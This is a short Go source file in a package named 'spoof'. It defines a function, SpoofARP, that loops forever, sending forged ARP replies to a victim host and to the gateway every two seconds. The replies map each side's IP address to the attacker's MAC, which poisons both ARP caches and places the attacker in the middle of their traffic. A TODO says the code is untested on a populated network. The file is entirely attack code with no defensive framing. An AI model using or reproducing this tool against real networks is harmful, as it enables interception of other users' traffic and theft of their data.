package spoof

import (
	"log"
	"net"
	"net/netip"
	"time"

	"github.com/mdlayher/arp"
)

// func SpoofARP(ifi *net.Interface, victimIP, gatewayIP net.IP, attackMAC, victimMAC net.HardwareAddr) error {
func SpoofARP(ifi *net.Interface, victimIP, gatewayIP netip.Addr, attackMAC, victimMAC net.HardwareAddr) error {
	c, err := arp.Dial(ifi)
	if err != nil {
		return err
	}
	defer c.Close()

	for {
		log.Printf("Spoofing [%s] through [%s]\n", victimIP.String(), gatewayIP.String())

		// TODO:
		// test this out when on a populated network

		packForVictim := &arp.Packet{
			Operation:          arp.OperationReply,
			SenderHardwareAddr: attackMAC,
			SenderIP:           gatewayIP,
			TargetHardwareAddr: victimMAC,
			TargetIP:           victimIP,
		}

		c.WriteTo(packForVictim, victimMAC)

		packForRouter := &arp.Packet{
			Operation:          arp.OperationReply,
			SenderHardwareAddr: attackMAC,
			SenderIP:           victimIP,
			TargetHardwareAddr: nil,
			TargetIP:           gatewayIP,
		}

		c.WriteTo(packForRouter, nil)

		time.Sleep(2 * time.Second)
	}
}
